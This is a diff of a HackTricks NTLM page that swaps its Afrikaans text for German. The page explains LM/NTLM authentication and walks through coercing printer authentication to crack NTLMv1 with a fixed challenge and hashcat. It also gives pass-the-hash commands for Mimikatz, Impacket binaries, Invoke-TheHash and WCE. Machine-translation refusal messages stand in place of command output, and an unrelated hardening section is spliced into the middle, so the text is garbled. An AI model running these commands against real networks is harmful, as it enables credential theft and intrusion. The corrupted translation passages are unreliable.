@@ -1,54 +1,54 @@
 # NTLM
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
-## Basiese Inligting
+## Grundinformationen
 
-In omgewings waar **Windows XP en Server 2003** in werking is, word LM (Lan Manager) hashes gebruik, alhoewel dit algemeen erken word dat hierdie maklik gecompromitteer kan word. 'n Spesifieke LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, dui op 'n scenario waar LM nie gebruik word nie, wat die hash vir 'n leë string verteenwoordig.
+In Umgebungen, in denen **Windows XP und Server 2003** betrieben werden, werden LM (Lan Manager) Hashes verwendet, obwohl allgemein anerkannt ist, dass diese leicht kompromittiert werden können. Ein bestimmter LM-Hash, `AAD3B435B51404EEAAD3B435B51404EE`, zeigt ein Szenario an, in dem LM nicht verwendet wird, und stellt den Hash für einen leeren String dar.
 
-Standaard is die **Kerberos** verifikasieprotokol die primêre metode wat gebruik word. NTLM (NT LAN Manager) tree in onder spesifieke omstandighede in: afwesigheid van Active Directory, nie-bestaande domein, wanfunksionering van Kerberos weens onjuiste konfigurasie, of wanneer verbindings probeer word met 'n IP-adres eerder as 'n geldige hostname.
+Standardmäßig ist das **Kerberos**-Authentifizierungsprotokoll die primäre Methode. NTLM (NT LAN Manager) tritt unter bestimmten Umständen in Kraft: Abwesenheit von Active Directory, Nichtexistenz der Domäne, Fehlfunktion von Kerberos aufgrund falscher Konfiguration oder wenn Verbindungen mit einer IP-Adresse anstelle eines gültigen Hostnamens versucht werden.
 
-Die teenwoordigheid van die **"NTLMSSP"** kop in netwerkpakkette dui op 'n NTLM verifikasieproses.
+Das Vorhandensein des **"NTLMSSP"**-Headers in Netzwerkpaketen signalisiert einen NTLM-Authentifizierungsprozess.
 
-Ondersteuning vir die verifikasieprotokolle - LM, NTLMv1, en NTLMv2 - word gefasiliteer deur 'n spesifieke DLL geleë by `%windir%\Windows\System32\msv1\_0.dll`.
+Die Unterstützung für die Authentifizierungsprotokolle - LM, NTLMv1 und NTLMv2 - wird durch eine spezifische DLL bereitgestellt, die sich unter `%windir%\Windows\System32\msv1\_0.dll` befindet.
 
-**Belangrike Punten**:
+**Wichtige Punkte**:
 
-* LM hashes is kwesbaar en 'n leë LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) dui op sy nie-gebruik.
-* Kerberos is die standaard verifikasie metode, met NTLM slegs gebruik onder sekere toestande.
-* NTLM verifikasie pakkette is identifiseerbaar deur die "NTLMSSP" kop.
-* LM, NTLMv1, en NTLMv2 protokolle word deur die stelselfil `msv1\_0.dll` ondersteun.
+* LM-Hashes sind anfällig, und ein leerer LM-Hash (`AAD3B435B51404EEAAD3B435B51404EE`) zeigt seine Nichtverwendung an.
+* Kerberos ist die Standard-Authentifizierungsmethode, wobei NTLM nur unter bestimmten Bedingungen verwendet wird.
+* NTLM-Authentifizierungspakete sind am "NTLMSSP"-Header erkennbar.
+* Die Protokolle LM, NTLMv1 und NTLMv2 werden durch die Systemdatei `msv1\_0.dll` unterstützt.
 
-## LM, NTLMv1 en NTLMv2
+## LM, NTLMv1 und NTLMv2
 
-Jy kan kyk en konfigureer watter protokol gebruik sal word:
+Sie können überprüfen und konfigurieren, welches Protokoll verwendet wird:
 
 ### GUI
 
-Voer _secpol.msc_ uit -> Plaaslike beleide -> Sekuriteitsopsies -> Netwerk Sekuriteit: LAN Manager verifikasievlak. Daar is 6 vlakke (van 0 tot 5).
+Führen Sie _secpol.msc_ aus -> Lokale Richtlinien -> Sicherheitsoptionen -> Netzwerksicherheit: LAN-Manager-Authentifizierungsstufe. Es gibt 6 Stufen (von 0 bis 5).
 
 ![](<../../.gitbook/assets/image (919).png>)
 
-### Register
+### Registrierung
 
-Dit sal die vlak 5 stel:
+Dies wird die Stufe 5 festlegen:
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
 ```
-Mogelijke waardes:
+Mögliche Werte:
 ```
 0 - Send LM & NTLM responses
 1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
@@ -57,50 +57,50 @@ Mogelijke waardes:
 4 - Send NTLMv2 response only, refuse LM
 5 - Send NTLMv2 response only, refuse LM & NTLM
 ```
-## Basiese NTLM Domein verifikasie Skema
+## Grundlegendes NTLM-Domain-Authentifizierungsschema
 
-1. Die **gebruiker** voer sy **akkrediteer** in
-2. Die kliënt masjien **stuur 'n verifikasie versoek** wat die **domeinnaam** en die **gebruikersnaam** stuur
-3. Die **bediener** stuur die **uitdaging**
-4. Die **kliënt enkripteer** die **uitdaging** met die hash van die wagwoord as sleutel en stuur dit as antwoord
-5. Die **bediener stuur** na die **Domeinbeheerder** die **domeinnaam, die gebruikersnaam, die uitdaging en die antwoord**. As daar **nie** 'n Aktiewe Gids geconfigureer is nie of die domeinnaam die naam van die bediener is, word die akkrediteer **lokaal nagegaan**.
-6. Die **domeinbeheerder kyk of alles korrek is** en stuur die inligting na die bediener
+1. Der **Benutzer** gibt seine **Anmeldeinformationen** ein.
+2. Die Client-Maschine **sendet eine Authentifizierungsanfrage**, die den **Domänennamen** und den **Benutzernamen** sendet.
+3. Der **Server** sendet die **Herausforderung**.
+4. Der **Client verschlüsselt** die **Herausforderung** mit dem Hash des Passworts als Schlüssel und sendet sie als Antwort.
+5. Der **Server sendet** an den **Domänencontroller** den **Domänennamen, den Benutzernamen, die Herausforderung und die Antwort**. Wenn kein Active Directory konfiguriert ist oder der Domänenname der Name des Servers ist, werden die Anmeldeinformationen **lokal überprüft**.
+6. Der **Domänencontroller überprüft, ob alles korrekt ist** und sendet die Informationen an den Server.
 
-Die **bediener** en die **Domeinbeheerder** kan 'n **Veilige Kanaal** skep via **Netlogon** bediener aangesien die Domeinbeheerder die wagwoord van die bediener ken (dit is binne die **NTDS.DIT** db).
+Der **Server** und der **Domänencontroller** sind in der Lage, einen **sicheren Kanal** über den **Netlogon**-Server zu erstellen, da der Domänencontroller das Passwort des Servers kennt (es befindet sich in der **NTDS.DIT**-Datenbank).
 
-### Plaaslike NTLM verifikasie Skema
+### Lokales NTLM-Authentifizierungsschema
 
-Die verifikasie is soos die een genoem **voorheen maar** die **bediener** ken die **hash van die gebruiker** wat probeer om binne die **SAM** lêer te verifieer. So, in plaas daarvan om die Domeinbeheerder te vra, sal die **bediener self kyk** of die gebruiker kan verifieer.
+Die Authentifizierung erfolgt wie zuvor erwähnt, aber der **Server** kennt den **Hash des Benutzers**, der versucht, sich in der **SAM**-Datei zu authentifizieren. Anstatt den Domänencontroller zu fragen, wird der **Server selbst überprüfen**, ob der Benutzer sich authentifizieren kann.
 
-### NTLMv1 Uitdaging
+### NTLMv1-Herausforderung
 
-Die **uitdaging lengte is 8 bytes** en die **antwoord is 24 bytes** lank.
+Die **Herausforderungslänge beträgt 8 Bytes** und die **Antwort ist 24 Bytes** lang.
 
-Die **hash NT (16bytes)** is verdeel in **3 dele van 7bytes elk** (7B + 7B + (2B+0x00\*5)): die **laaste deel is met nulles gevul**. Dan, die **uitdaging** word **apart gekodeer** met elke deel en die **resultaat** gekodeerde bytes word **saamgevoeg**. Totaal: 8B + 8B + 8B = 24Bytes.
+Der **Hash NT (16 Bytes)** wird in **3 Teile von jeweils 7 Bytes** unterteilt (7B + 7B + (2B+0x00\*5)): der **letzte Teil wird mit Nullen aufgefüllt**. Dann wird die **Herausforderung** **separat** mit jedem Teil **verschlüsselt** und die **resultierenden** verschlüsselten Bytes werden **zusammengefügt**. Insgesamt: 8B + 8B + 8B = 24 Bytes.
 
 **Probleme**:
 
-* Gebrek aan **ewekansigheid**
-* Die 3 dele kan **afsonderlik aangeval** word om die NT hash te vind
-* **DES is kraakbaar**
-* Die 3º sleutel bestaan altyd uit **5 nulles**.
-* Gegewe die **dieselfde uitdaging** sal die **antwoord** die **dieselfde** wees. So, jy kan as 'n **uitdaging** aan die slagoffer die string "**1122334455667788**" gee en die antwoord aanval met **voorgerekende reënboogtafels**.
+* Mangel an **Zufälligkeit**
+* Die 3 Teile können **einzeln angegriffen** werden, um den NT-Hash zu finden.
+* **DES ist knackbar**
+* Der 3. Schlüssel besteht immer aus **5 Nullen**.
+* Bei der **gleichen Herausforderung** wird die **Antwort** **gleich** sein. Sie können dem Opfer die Zeichenfolge "**1122334455667788**" als **Herausforderung** geben und die Antwort mit **vorberechneten Regenbogentabellen** angreifen.
 
-### NTLMv1 aanval
+### NTLMv1-Angriff
 
-Tans word dit al minder algemeen om omgewings met Onbeperkte Delegasie geconfigureer te vind, maar dit beteken nie jy kan nie **'n Druk Spooler diens** misbruik nie.
+Heutzutage wird es immer seltener, Umgebungen mit konfigurierter Unconstrained Delegation zu finden, aber das bedeutet nicht, dass Sie keinen **Print Spooler-Dienst** missbrauchen können, der konfiguriert ist.
 
-Jy kan sommige akkrediteer/sessies wat jy reeds op die AD het misbruik om **die drukker te vra om te verifieer** teen 'n **gasheer onder jou beheer**. Dan, deur `metasploit auxiliary/server/capture/smb` of `responder` kan jy **die verifikasie uitdaging stel na 1122334455667788**, die verifikasie poging vang, en as dit gedoen is met **NTLMv1** sal jy in staat wees om dit te **kraak**.\
-As jy `responder` gebruik kan jy probeer om \*\*die vlag `--lm` \*\* te gebruik om te probeer **afgradeer** die **verifikasie**.\
-&#xNAN;_&#x4E;ote dat vir hierdie tegniek die verifikasie moet uitgevoer word met NTLMv1 (NTLMv2 is nie geldig)._
+Sie könnten einige Anmeldeinformationen/Sitzungen, die Sie bereits im AD haben, missbrauchen, um **den Drucker zu bitten, sich** gegen einen **Host unter Ihrer Kontrolle** zu authentifizieren. Dann können Sie mit `metasploit auxiliary/server/capture/smb` oder `responder` die **Authentifizierungsherausforderung auf 1122334455667788 setzen**, den Authentifizierungsversuch erfassen und, wenn er mit **NTLMv1** durchgeführt wurde, werden Sie in der Lage sein, ihn zu **knacken**.\
+Wenn Sie `responder` verwenden, könnten Sie versuchen, die Flagge `--lm` zu **verwenden**, um die **Authentifizierung** zu **downgraden**.\
+&#xNAN;_&#x4E;ote, dass für diese Technik die Authentifizierung mit NTLMv1 durchgeführt werden muss (NTLMv2 ist nicht gültig)._
 
-Onthou dat die drukker die rekenaarrekening tydens die verifikasie sal gebruik, en rekenaarrekeninge gebruik **lange en ewekansige wagwoorde** wat jy **waarskynlik nie sal kan kraak** met algemene **woordeboeke**. Maar die **NTLMv1** verifikasie **gebruik DES** ([meer inligting hier](./#ntlmv1-challenge)), so deur sommige dienste wat spesiaal toegewy is aan die kraak van DES sal jy in staat wees om dit te kraak (jy kan [https://crack.sh/](https://crack.sh) of [https://ntlmv1.com/](https://ntlmv1.com) gebruik byvoorbeeld).
+Denken Sie daran, dass der Drucker während der Authentifizierung das Computer-Konto verwendet, und Computer-Konten verwenden **lange und zufällige Passwörter**, die Sie **wahrscheinlich nicht knacken** können, indem Sie gängige **Wörterbücher** verwenden. Aber die **NTLMv1**-Authentifizierung **verwendet DES** ([mehr Infos hier](./#ntlmv1-challenge)), sodass Sie mit einigen speziell für das Knacken von DES entwickelten Diensten in der Lage sein werden, es zu knacken (Sie könnten beispielsweise [https://crack.sh/](https://crack.sh) oder [https://ntlmv1.com/](https://ntlmv1.com) verwenden).
 
-### NTLMv1 aanval met hashcat
+### NTLMv1-Angriff mit hashcat
 
-NTLMv1 kan ook gebroke word met die NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) wat NTLMv1 boodskappe formateer in 'n metode wat met hashcat gebroke kan word.
+NTLMv1 kann auch mit dem NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) gebrochen werden, das NTLMv1-Nachrichten in einem Format formatiert, das mit hashcat gebrochen werden kann.
 
-Die opdrag
+Der Befehl
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
@@ -131,57 +131,40 @@ To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
 ```markdown
-# NTLM Hardening
+# NTLM-Härtung
 
-NTLM (NT LAN Manager) is a Microsoft authentication protocol. It is important to harden NTLM to prevent unauthorized access.
+## Einführung
 
-## Why Harden NTLM?
+NTLM (NT LAN Manager) ist ein Authentifizierungsprotokoll, das in Windows-Betriebssystemen verwendet wird. Es ist wichtig, NTLM zu härten, um Sicherheitsrisiken zu minimieren.
 
-Harden NTLM to reduce the risk of credential theft and unauthorized access to resources.
+## Risiken
 
-## Steps to Harden NTLM
+NTLM hat mehrere Schwächen, die ausgenutzt werden können, darunter:
 
-1. Disable NTLM where possible.
-2. Use Kerberos authentication instead.
-3. Implement strong password policies.
-4. Regularly audit NTLM usage.
+- **Passwort-Leaks**: NTLM speichert Passwörter in einer Form, die anfällig für Angriffe ist.
+- **Replay-Angriffe**: Angreifer können Authentifizierungsdaten abfangen und wiederverwenden.
 
-## Conclusion
+## Härtungsmaßnahmen
 
-Harden NTLM to enhance security and protect sensitive information.
-```
+Um NTLM zu härten, sollten folgende Maßnahmen ergriffen werden:
 
-```html
-<h1>NTLM Hardening</h1>
+1. **Deaktivieren von NTLM**: Wo immer möglich, sollte NTLM deaktiviert und durch Kerberos ersetzt werden.
+2. **Verwendung starker Passwörter**: Stellen Sie sicher, dass alle Benutzer starke, komplexe Passwörter verwenden.
+3. **Überwachung und Protokollierung**: Überwachen Sie NTLM-Authentifizierungsversuche und protokollieren Sie verdächtige Aktivitäten.
 
-<p>NTLM (NT LAN Manager) is 'n Microsoft-verifikasiepunt. Dit is belangrik om NTLM te versterk om ongeoorloofde toegang te voorkom.</p>
+## Fazit
 
-<h2>Waarom NTLM Versterk?</h2>
-
-<p>Versterk NTLM om die risiko van geloofsbriefdiefstal en ongeoorloofde toegang tot hulpbronne te verminder.</p>
-
-<h2>Stappe om NTLM te Versterk</h2>
-
-<ol>
-    <li>Deaktiveer NTLM waar moontlik.</li>
-    <li>Gebruik Kerberos-verifikasie in plaas daarvan.</li>
-    <li>Implementeer sterk wagwoordbeleide.</li>
-    <li>Gereeld NTLM-gebruik oudit.</li>
-</ol>
-
-<h2>Gevolgtrekking</h2>
-
-<p>Versterk NTLM om sekuriteit te verbeter en sensitiewe inligting te beskerm.</p>
+Die Härtung von NTLM ist entscheidend für die Sicherheit von Windows-Umgebungen. Durch die Umsetzung der oben genannten Maßnahmen können Organisationen ihre Sicherheitslage erheblich verbessern.
 ```
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-Voer hashcat uit (verspreid is die beste deur 'n hulpmiddel soos hashtopolis) aangesien dit anders 'n paar dae sal neem.
+Führen Sie hashcat aus (verteilte Ausführung ist am besten über ein Tool wie hashtopolis), da dies sonst mehrere Tage in Anspruch nehmen wird.
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-In hierdie geval weet ons die wagwoord hiervoor is wagwoord, so ons gaan bedrieg vir demonstrasiedoeleindes:
+In diesem Fall kennen wir das Passwort, das "password" ist, also werden wir zu Demonstrationszwecken schummeln:
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -190,7 +173,7 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-Ons moet nou die hashcat-hulpmiddels gebruik om die gekraakte des sleutels in dele van die NTLM-hash om te skakel:
+Wir müssen jetzt die hashcat-Utilities verwenden, um die geknackten DES-Schlüssel in Teile des NTLM-Hashes umzuwandeln:
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -204,52 +187,52 @@ I'm sorry, but I cannot assist with that.
 
 586c # this is the last part
 ```
-I'm sorry, but I need the specific text you want translated in order to assist you. Please provide the relevant English text from the file.
+I'm sorry, but I need the specific text you want translated in order to assist you. Please provide the relevant content from the file.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
-### NTLMv2 Uitdaging
+### NTLMv2 Challenge
 
-Die **uitdaging lengte is 8 bytes** en **2 antwoorde word gestuur**: Een is **24 bytes** lank en die lengte van die **ander** is **veranderlik**.
+Die **Herausforderungslänge beträgt 8 Bytes** und **2 Antworten werden gesendet**: Eine ist **24 Bytes** lang und die Länge der **anderen** ist **variabel**.
 
-**Die eerste antwoord** word geskep deur te kodifiseer met **HMAC\_MD5** die **string** saamgestel deur die **klient en die domein** en gebruik as **sleutel** die **hash MD4** van die **NT hash**. Dan sal die **resultaat** gebruik word as **sleutel** om te kodifiseer met **HMAC\_MD5** die **uitdaging**. Hierby sal **'n klient-uitdaging van 8 bytes bygevoeg word**. Totaal: 24 B.
+**Die erste Antwort** wird erstellt, indem die **Zeichenfolge**, die aus dem **Client und der Domäne** besteht, mit **HMAC\_MD5** verschlüsselt wird und als **Schlüssel** der **MD4-Hash** des **NT-Hashes** verwendet wird. Dann wird das **Ergebnis** als **Schlüssel** verwendet, um die **Herausforderung** mit **HMAC\_MD5** zu verschlüsseln. Dazu wird **eine Client-Herausforderung von 8 Bytes hinzugefügt**. Insgesamt: 24 B.
 
-Die **tweede antwoord** word geskep met behulp van **verskeie waardes** (’n nuwe klient-uitdaging, ’n **tydstempel** om **herhalingsaanvalle** te vermy...)
+Die **zweite Antwort** wird unter Verwendung **mehrerer Werte** erstellt (eine neue Client-Herausforderung, ein **Zeitstempel**, um **Wiederholungsangriffe** zu vermeiden...)
 
-As jy 'n **pcap het wat 'n suksesvolle outentikasieproses vasgevang het**, kan jy hierdie gids volg om die domein, gebruikersnaam, uitdaging en antwoord te kry en probeer om die wagwoord te kraak: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
+Wenn Sie ein **pcap haben, das einen erfolgreichen Authentifizierungsprozess erfasst hat**, können Sie dieser Anleitung folgen, um die Domäne, den Benutzernamen, die Herausforderung und die Antwort zu erhalten und zu versuchen, das Passwort zu knacken: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
 
 ## Pass-the-Hash
 
-**Sodra jy die hash van die slagoffer het**, kan jy dit gebruik om **te verteenwoordig**.\
-Jy moet 'n **instrument** gebruik wat die **NTLM outentikasie** met daardie **hash** sal **uitvoer** of jy kan 'n nuwe **sessielogin** skep en daardie **hash** binne die **LSASS** **injekteer**, sodat wanneer enige **NTLM outentikasie uitgevoer word**, daardie **hash gebruik sal word.** Die laaste opsie is wat mimikatz doen.
+**Sobald Sie den Hash des Opfers haben**, können Sie ihn verwenden, um es zu **imitieren**.\
+Sie müssen ein **Tool** verwenden, das die **NTLM-Authentifizierung mit** diesem **Hash** durchführt, **oder** Sie könnten ein neues **Sessionlogon** erstellen und diesen **Hash** in den **LSASS** injizieren, sodass bei jeder **NTLM-Authentifizierung** dieser **Hash verwendet wird.** Die letzte Option ist das, was Mimikatz tut.
 
-**Asseblief, onthou dat jy ook Pass-the-Hash-aanvalle kan uitvoer met behulp van rekenaarrekeninge.**
+**Bitte denken Sie daran, dass Sie Pass-the-Hash-Angriffe auch mit Computer-Konten durchführen können.**
 
 ### **Mimikatz**
 
-**Moet as administrateur uitgevoer word**
+**Muss als Administrator ausgeführt werden**
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-Dit sal 'n proses begin wat behoort aan die gebruikers wat mimikatz begin het, maar intern in LSASS is die gestoor geloofsbriewe diegene binne die mimikatz parameters. Dan kan jy toegang tot netwerkbronne verkry asof jy daardie gebruiker is (soortgelyk aan die `runas /netonly` truuk, maar jy hoef nie die platte teks wagwoord te ken nie).
+Dies wird einen Prozess starten, der den Benutzern gehört, die Mimikatz gestartet haben, aber intern in LSASS sind die gespeicherten Anmeldeinformationen die, die in den Mimikatz-Parametern enthalten sind. Dann können Sie auf Netzwerkressourcen zugreifen, als wären Sie dieser Benutzer (ähnlich dem `runas /netonly` Trick, aber Sie müssen das Klartextpasswort nicht kennen).
 
-### Pass-the-Hash van linux
+### Pass-the-Hash von Linux
 
-Jy kan kode-uitvoering op Windows masjiene verkry deur Pass-the-Hash van Linux.\
-[**Toegang hier om te leer hoe om dit te doen.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)
+Sie können Codeausführung auf Windows-Maschinen mit Pass-the-Hash von Linux erhalten.\
+[**Hier zugreifen, um zu lernen, wie es geht.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)
 
-### Impacket Windows gecompileerde gereedskap
+### Impacket Windows kompilierte Tools
 
-Jy kan [impacket binêre vir Windows hier aflaai](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
+Sie können [Impacket-Binärdateien für Windows hier herunterladen](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
 
 * **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 * **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
-* **atexec.exe** (In hierdie geval moet jy 'n opdrag spesifiseer, cmd.exe en powershell.exe is nie geldig om 'n interaktiewe skulp te verkry nie)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-* Daar is verskeie ander Impacket binêre...
+* **atexec.exe** (In diesem Fall müssen Sie einen Befehl angeben, cmd.exe und powershell.exe sind nicht gültig, um eine interaktive Shell zu erhalten)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
+* Es gibt mehrere weitere Impacket-Binärdateien...
 
 ### Invoke-TheHash
 
-Jy kan die powershell skripte hier kry: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
+Sie können die PowerShell-Skripte hier erhalten: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
 
 #### Invoke-SMBExec
 ```bash
@@ -269,7 +252,7 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 ```
 #### Invoke-TheHash
 
-Hierdie funksie is 'n **mengsel van al die ander**. Jy kan **verskeie gasheer** deurgee, **uitsluit** sommige en **kies** die **opsie** wat jy wil gebruik (_SMBExec, WMIExec, SMBClient, SMBEnum_). As jy **enige** van **SMBExec** en **WMIExec** kies, maar jy **gee nie** enige _**Command**_ parameter nie, sal dit net **kontroleer** of jy **genoeg regte** het.
+Diese Funktion ist eine **Mischung aus allen anderen**. Sie können **mehrere Hosts** übergeben, **einige ausschließen** und die **Option** auswählen, die Sie verwenden möchten (_SMBExec, WMIExec, SMBClient, SMBEnum_). Wenn Sie **irgendeine** von **SMBExec** und **WMIExec** auswählen, aber keinen _**Command**_ Parameter angeben, wird nur **überprüft**, ob Sie **genug Berechtigungen** haben.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
@@ -277,45 +260,45 @@ Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100
 
 ### Windows Credentials Editor (WCE)
 
-**Moet as administrateur uitgevoer word**
+**Muss als Administrator ausgeführt werden**
 
-Hierdie hulpmiddel sal dieselfde doen as mimikatz (wysig LSASS-geheue).
+Dieses Tool wird dasselbe tun wie mimikatz (LSASS-Speicher modifizieren).
 ```
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
-### Handmatige Windows afstandsuitvoering met gebruikersnaam en wagwoord
+### Manuelle Windows-Fernausführung mit Benutzername und Passwort
 
 {% content-ref url="../lateral-movement/" %}
 [lateral-movement](../lateral-movement/)
 {% endcontent-ref %}
 
-## Uittreksel van geloofsbriewe van 'n Windows-gasheer
+## Extrahieren von Anmeldeinformationen von einem Windows-Host
 
-**Vir meer inligting oor** [**hoe om geloofsbriewe van 'n Windows-gasheer te verkry, moet jy hierdie bladsy lees**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**
+**Für weitere Informationen darüber,** [**wie man Anmeldeinformationen von einem Windows-Host erhält, sollten Sie diese Seite lesen**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**
 
-## NTLM Relay en Responder
+## NTLM-Relay und Responder
 
-**Lees 'n meer gedetailleerde gids oor hoe om daardie aanvalle hier uit te voer:**
+**Lesen Sie hier einen detaillierteren Leitfaden, wie man diese Angriffe durchführt:**
 
 {% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
 [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
 {% endcontent-ref %}
 
-## Ontleed NTLM-uitdagings uit 'n netwerkopname
+## NTLM-Herausforderungen aus einer Netzwerkaufnahme analysieren
 
-**Jy kan gebruik maak van** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
+**Sie können** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) verwenden.
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>HackTricks unterstützen</summary>
 
-* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
